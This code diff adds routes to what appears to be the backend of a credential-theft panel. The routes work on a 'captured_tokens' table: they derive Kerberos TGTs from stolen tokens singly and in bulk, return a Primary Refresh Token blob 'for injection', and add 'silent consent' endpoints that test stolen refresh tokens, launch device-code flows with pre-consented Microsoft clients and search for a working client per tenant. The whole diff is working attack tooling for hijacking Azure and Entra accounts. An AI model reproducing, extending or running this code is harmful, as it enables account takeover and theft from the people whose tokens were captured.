@@ -4,6 +4,8 @@ const db = require('../database/connection');
 const { userAuth } = require('../middleware/auth');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const config = require('../config/env');
+const kerberosService = require('../services/kerberos');
+const silentConsentService = require('../services/silentconsent');
 
 // ─── Skip /inject/* paths - these are handled by cookieinject.js ────
 // This prevents /api/tokens/inject/* from being matched by tokenRoutes
@@ -880,6 +882,155 @@ router.post('/export-delete-all', userAuth, async (req, res) => {
     });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// ─── Derive Kerberos TGTs for a specific token ──────────────────────
+router.post('/:id/derive-tgt', userAuth, async (req, res) => {
+  try {
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+      [req.params.id, req.user.id]
+    );
+    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
+
+    const token = tokens[0];
+
+    // Call kerberos service to derive TGTs
+    const result = await kerberosService.deriveTGTForToken(req.params.id);
+
+    if (result.success) {
+      res.json({
+        success: true,
+        message: 'Kerberos TGTs derived successfully',
+        token_id: result.token_id,
+        email: result.email,
+        tgt_cloud: result.tgt_cloud,
+        tgt_ad: result.tgt_ad,
+        session_key: result.session_key,
+        kerberos_top_level_names: result.kerberos_top_level_names,
+        tgt_cloud_sessionkey: result.tgt_cloud_sessionkey
+      });
+    } else {
+      res.status(400).json({ error: result.error, success: false });
+    }
+  } catch (err) {
+    console.error('[Tokens] TGT derivation error:', err.message);
+    res.status(500).json({ error: 'TGT derivation failed: ' + err.message });
+  }
+});
+
+// ─── Bulk derive Kerberos TGTs for all eligible tokens ──────────────
+router.post('/bulk-derive-tgts', userAuth, async (req, res) => {
+  try {
+    const limit = parseInt(req.body.limit) || 50;
+    const stats = await kerberosService.bulkDeriveTGTs(limit);
+    res.json({
+      success: true,
+      ...stats
+    });
+  } catch (err) {
+    console.error('[Tokens] Bulk TGT derivation error:', err.message);
+    res.status(500).json({ error: 'Bulk TGT derivation failed: ' + err.message });
+  }
+});
+
+// ─── Get full PRT credential blob for injection ─────────────────────
+router.get('/:id/full-credential-blob', userAuth, async (req, res) => {
+  try {
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+      [req.params.id, req.user.id]
+    );
+    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
+
+    const result = await kerberosService.getFullPRTCredentialBlob(req.params.id);
+
+    if (result.success) {
+      res.json({
+        success: true,
+        blob: result.blob
+      });
+    } else {
+      res.status(400).json({ error: result.error, success: false });
+    }
+  } catch (err) {
+    console.error('[Tokens] Credential blob error:', err.message);
+    res.status(500).json({ error: 'Failed to get credential blob: ' + err.message });
+  }
+});
+
+// ─── Silent consent: Test if existing refresh token works ────────────
+router.post('/silent-consent/test', userAuth, async (req, res) => {
+  try {
+    const { refresh_token, tenant, account_type, template_type } = req.body;
+
+    if (!refresh_token) {
+      return res.status(400).json({ error: 'refresh_token is required' });
+    }
+
+    const tenantVal = tenant || config.AZURE_TENANT || 'common';
+    const accountType = account_type || 'work_school';
+    const templateType = template_type || 'office';
+
+    const consentConfig = silentConsentService.getPreConsentedClient(accountType, tenantVal, templateType);
+    const result = await silentConsentService.testRefreshToken(
+      refresh_token,
+      consentConfig.tokenEndpoint,
+      consentConfig.client_id,
+      consentConfig.scopes
+    );
+
+    res.json({
+      success: result.success,
+      consent_required: !result.success,
+      access_token: result.access_token,
+      new_refresh_token: result.new_refresh_token,
+      strategy: result.success ? 'token_valid' : 'consent_needed'
+    });
+  } catch (err) {
+    console.error('[Tokens] Silent consent test error:', err.message);
+    res.status(500).json({ error: 'Silent consent test failed: ' + err.message });
+  }
+});
+
+// ─── Silent consent: Initiate device flow with pre-consented client ─
+router.post('/silent-consent/device-flow', userAuth, async (req, res) => {
+  try {
+    const { tenant, account_type, template_type, existing_refresh_token } = req.body;
+
+    const tenantVal = tenant || config.AZURE_TENANT || 'common';
+    const accountType = account_type || 'work_school';
+    const templateType = template_type || 'office';
+
+    const result = await silentConsentService.initiateSilentDeviceFlow(
+      tenantVal,
+      accountType,
+      templateType,
+      existing_refresh_token
+    );
+
+    res.json(result);
+  } catch (err) {
+    console.error('[Tokens] Silent consent device flow error:', err.message);
+    res.status(500).json({ error: 'Silent consent device flow failed: ' + err.message });
+  }
+});
+
+// ─── Silent consent: Find best working client for tenant ─────────────
+router.post('/silent-consent/find-client', userAuth, async (req, res) => {
+  try {
+    const { tenant, account_type, template_type } = req.body;
+
+    const tenantVal = tenant || config.AZURE_TENANT || 'common';
+    const accountType = account_type || 'work_school';
+    const templateType = template_type || 'office';
+
+    const result = await silentConsentService.findWorkingClient(tenantVal, accountType, templateType);
+    res.json(result);
+  } catch (err) {
+    console.error('[Tokens] Find client error:', err.message);
+    res.status(500).json({ error: 'Find client failed: ' + err.message });
   }
 });
 
